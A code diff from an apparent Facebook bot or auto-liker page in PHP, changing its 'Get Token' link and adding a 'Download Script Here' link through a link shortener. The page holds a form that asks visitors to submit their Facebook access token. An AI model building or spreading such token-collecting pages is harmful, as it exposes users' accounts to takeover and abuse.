@@ -291,7 +291,9 @@ public function form(){
 <br>
 <br><center><a target="_blank" href="http://m.fb.com/100025466832535"><img src="https://graph.facebook.com/100025466832535/picture?type=large" alt="" style="border-radius: 50px; border: 2px; box-shadow: 0px 0px 7px 2px 	#42f4f1; padding: 0px;" width="300" height="300" title=""/></a>
 <strong> <font style="color:red;font-size:33px;font-family:miaanFont"><h3 align="center"><font style="background: url( ) color:#f6216f;  font-family:miaanFont;font-size:70px;"> <a href="https://bottersking.com/token" target="_blank">
-<center><a href="http://hassantokens.tk/" target="blank"> Get Token </a></center>
+<center><a href="http://bottersking.com/token/" target="blank"> Get Token </a>
+<br>
+	<a href="http://zipansion.com/24fhq" target="blank"> Download Script Here </a></center>
 </font>
   <center></br><form action=""method="POST"><input class="input" type="text"name="access_token" style="height:28px;" value="">
 <input class="button button5" type="submit"name="saveFile" style="height:28px;" '.$warna1.';border:2px groove '.$warna.';height:50px;width:22px"autocomplete="off" value="SUBMIT"onfocus="value="SUBMIT=""></form></center><br>
